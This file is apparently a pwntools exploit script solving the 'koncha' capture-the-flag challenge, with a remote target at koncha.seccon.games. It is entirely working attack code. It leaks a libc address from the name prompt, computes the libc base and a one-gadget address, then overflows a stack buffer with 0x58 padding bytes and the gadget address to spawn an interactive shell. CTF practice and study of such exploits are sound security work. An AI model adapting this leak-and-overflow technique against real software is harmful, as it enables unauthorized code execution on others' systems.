#!/usr/bin/env python3
# -*- coding:utf-8 -*

from pwn import *
from sys import argv
from time import sleep

context.terminal = ['tmux', 'sp', '-h']
context.log_level = "debug"

chall = "./chall"
#libc = ELF()
elf = ELF(chall)
context.binary = chall
context.binary.checksec()

if len(argv) >= 2 and argv[1] == "r":
    p = remote("koncha.seccon.games", 9001)
elif len(argv) >= 2 and argv[1] == "d":
	cmd = """
		b *main+43
		b *main+103
		b *main+150
		c
	"""
	p = gdb.debug(chall,cmd)
else:
    p = process(chall)

# libc leak
p.recvuntil("name?")
p.sendline(b'')

p.recvuntil("you, ")
leak = u64(p.recv(6) + b'\00' * 2)
log.info("leak: " + hex(leak))
libc_base = leak - 0x1f12e8
log.info("libc base: " + hex(libc_base))
one_gadget_off = 0xe3b01
one_gadget_addr = libc_base + one_gadget_off
log.info("OneGadget: " + hex(one_gadget_addr))

# send payload + 0x00
payload = b"A" * 0x58# pudding
payload += p64(one_gadget_addr)
p.recvuntil("in?")
p.sendline(payload)

p.interactive()
